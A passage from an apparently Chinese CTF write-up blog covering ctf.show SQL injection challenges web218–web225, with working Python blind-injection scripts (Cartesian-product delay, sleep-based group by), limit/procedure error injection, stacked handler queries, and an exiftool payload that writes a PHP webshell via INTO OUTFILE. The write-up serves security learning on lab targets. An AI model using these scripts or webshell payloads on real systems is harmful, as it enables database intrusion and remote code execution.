punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h4><p><code>benchmark</code>被ban了</p><p>还有一种方法 使用查询语句 查询大量数据从而消耗时间</p><p>本地先演示一次 users一共六条数据 最终会有36条数据 6*6&#x3D;36 form后 如果是逗号 会进行排列组合 如果表足够大那么查询的数据也就相</p><p>当大（原理不用理解 记住这么用能查询大量数据即可）该方式叫笛卡尔积</p><p><img src="web218.png" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://2ba8df77-69bf-43d4-99e0-b2689ef71af6.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">7</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagxc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagaac,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token comment"># ctfshow&#123;f470e6gb-3856-42D3-ae55-402e84412f0P&#125;</span><span class="token comment"># ctfshow&#123;f47hc6hb-3856-4293-ae55-402e84412f04&#125;</span><span class="token comment"># ctfshow&#123;f470c7dh-3856-4293-ae55-402e84412f04&#125;</span><span class="token comment"># ctfshow&#123;f470c6db-3856-4293-ae55-402e84412f04&#125; √</span></code></pre><h4 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h4><p>多屏蔽了一个rlike（也是延时的一种方法） 上一题脚本依旧可以</p><h4 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h4><p>过滤了substr 那就使用left即可 并且过滤了concat 导致我们group_concat 不 能使用 但是可以是用limit 逐行获取</p><p><strong>limit N,M</strong> : 相当于 <strong>limit M offset N</strong> , 从第 N 条记录开始, 返回 M 条记录</p><p>另外ascii也被ban了，所以直接比较字符串</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://83d3e450-cfe1-4e34-9769-2021e662fa03.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>flagdic <span class="token operator">=</span> <span class="token string">"1234567890-_&#123;&#125;qwertyuioplkjhgfdsazxcvbnm, "</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagdic<span class="token punctuation">:</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagxcac,ctfshow_info</span>        <span class="token comment"># payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"</span>        <span class="token comment"># 查列名  id,flagaabcc,info</span>        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabcc from ctfshow_flagxcac"</span>        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(left((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">',(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web221-limit注入"><a href="#web221-limit注入" class="headerlink" title="web221(limit注入)"></a>web221(limit注入)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user <span class="token function">limit</span> <span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$limit</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token punctuation">;</span>    </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:很安全，不需要过滤</span><span class="token comment">//拿到数据库名字就算你赢</span>      </code></pre><p>1）<strong>limit前面没有order by时，后面可以跟union，如果存在order by，则不能使用union。</strong></p><p>2）limit后面不能直接跟select语句和if语句。<strong>可以跟procedure语句，值得注意的是只有在5.0.0&lt; MySQL &lt;5.6.6版本才可以使用，procedure后面支持报错注入以及时间盲注</strong></p><p>3）limit 关键字后面还可跟PROCEDURE和 INTO两个关键字，但是 INTO 后面写入文件需要知道绝对路径以及写入shell的权限，因此利用比较难。</p><p><a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/procedure-analyse.html">PROCEDURE ANALYZE</a></p><p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;api&#x2F;?page&#x3D;1&amp;limit&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</code></pre><p><img src="web221.png" loading="lazy"></p><h4 id="web222-group注入"><a href="#web222-group注入" class="headerlink" title="web222(group注入)"></a>web222(group注入)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group <span class="token class-name type-declaration">by</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    </code></pre><p><a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html#1869274163">group by注入原理</a></p><p>延时盲注，例如</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">group by if(1&#x3D;1,sleep(1),1)</code></pre><blockquote><p>但要注意的是，group by会向下一直查询，数据库里总共有21条数据，如果我们是sleep(0.05)则是停顿1.05秒</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://cfb15639-dd8d-4146-a2c1-5b6e2e349162.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flaga,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagaabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"concat((if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(0.05), 2)),1);"</span></span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h4><p>group by 位置注入，和上一题差不多，不过这次再尝试会发现禁用了数字，改用 true 构造数字。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">'true'</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>        <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">"https://9fb07532-bf0d-4e1c-b4aa-241e19c88933.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagas,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagasabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"(if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">, username, 'a'))"</span></span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"userAUTO"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web224-文件名注入"><a href="#web224-文件名注入" class="headerlink" title="web224(文件名注入)"></a>web224(文件名注入)</h4><p>查看&#x2F;robots.txt，发现&#x2F;pwdreset.php，进去后可以重置admin密码，然后是进行文件上传，但是上传什么文件都是类型错误</p><p>文件名注入，下载群里的<code>payload.bin</code>，十六进制的意思是</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`$_GET[1]?`</span><span class="token operator">></span></span></code></pre><p>然后进行Rce就行</p><p><img src="web224.png" loading="lazy"></p><p><strong>upload.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Return Code: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">10</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"文件过大: "</span> <span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" Kb&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".zip"</span><span class="token punctuation">;</span>      <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span><span class="token punctuation">,</span><span class="token variable">$filetype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"file type error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filepath</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filetype</span><span class="token operator">.</span><span class="token string double-quoted-string">"');"</span><span class="token punctuation">;</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:filelist.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span></code></pre><p>查询语句：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">$sql &#x3D; &quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#39;&quot;.$filename.&quot;&#39;,&#39;&quot;.$filepath.&quot;&#39;,&#39;&quot;.$filetype.&quot;&#39;);&quot;;</code></pre><p><img src="https://img-blog.csdnimg.cn/2020050915132686.png" alt="在这里插入图片描述" loading="lazy"><br>一般写成16进制形式，避免语句本身的单引号双引号对拼接造成干扰</p><p><img src="https://img-blog.csdnimg.cn/20200509151345661.png" alt="在这里插入图片描述" loading="lazy"><br>本地测试发现，写进去的16进制会自动被计算机识别出ASCII</p><p>用到exiftool工具把这个语句写到图片属性里面  语法：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">exiftool -overwrite_original -comment&#x3D;&quot;y1ng\&quot;&#39;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;--+&quot;</code></pre><h4 id="web225-堆叠plus"><a href="#web225-堆叠plus" class="headerlink" title="web225(堆叠plus)"></a>web225(堆叠plus)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//师傅说过滤的越多越好</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p><strong>hander</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;ctfshow&#39;;show tables;?username&#x3D;ctfshow&#39;;handler &#96;ctfshow_flagasa&#96; open;handler &#96;ctfshow_flagasa&#96; read first;</code></pre><p><strong>预处理</strong></p><p>利用concat绕过一切过滤，之后就是替换后面的database()为想要执行的语句即可，别忘了加空格</p><p>对于不知道啥是预处理：<a 